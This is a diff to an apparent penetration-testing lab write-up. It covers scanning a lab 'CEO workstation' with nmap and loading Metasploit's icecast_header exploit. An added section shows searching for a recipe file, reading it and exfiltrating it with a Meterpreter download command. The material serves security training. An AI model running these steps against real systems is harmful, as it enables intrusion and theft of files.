@@ -50,7 +50,7 @@ A service and version scan was ran first using nmap to determine the service and
   
 * Command used: `nmap -sV 192.168.0.20`
   -  nmap = network scanner
-  -  -sV = specificationt to run a service and version scan
+  -  -sV = specification to run a service and version scan
   -  192.168.0.20 = target the scan is being ran against (The CEO's workstation IP address)
   
 ![TODO](https://github.com/Tamie13/Penetration-Testing-Week-2/blob/main/Unit%2017%20Illustrations/Service%20and%20Version%20Scan.png)
@@ -80,7 +80,7 @@ A more generic search focused on the word `cast` was also ran to compare results
   
 To load the module for exploit you can use the entire path of the module found or you can use the number in front of the module as we have done in the image below.
   
-  -  Command To Use Module = `use /exploit/windows/http/icecast_header` 
+  -  Command To Use Entire Path Module = `use /exploit/windows/http/icecast_header` 
   -  Command Using Just Number = `use 23`
   
   
@@ -118,6 +118,21 @@ As can be seen above the command was successful in finding a file with `secretfi
 ![TODO](https://github.com/Tamie13/Penetration-Testing-Week-2/blob/main/Unit%2017%20Illustrations/recipe.txt%20search.png)
   
 Again, the search was successful in finding a file containing the word `recipe` as well as the path to the file.
+  
+From root directory we changed into the directory where the `Drinks.recipe.txt` was found.
+
+Once in the directory we read the contents of the file.
+   -  Command To Open & Read File = cat `Drinks.recipe.txt` (see results below)
+  
+![TODO](https://github.com/Tamie13/Penetration-Testing-Week-2/blob/main/Unit%2017%20Illustrations/Drink%20Recipe.png)
+  
+Taking the security testing further we were able to exfiltrate the `Drinks.recipe.text` and download it from the CEO's workstation back to the attacker machine.
+
+   -  Command To Exfiltrate & Download Recipe = `download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'
+  
+![TODO](https://github.com/Tamie13/Penetration-Testing-Week-2/blob/main/Unit%2017%20Illustrations/download%20recipe.png)
+  
+The file was successfully stolen from the CEO's computer as can be seen above.
   
 
 There should be a separate finding for each vulnerability found.
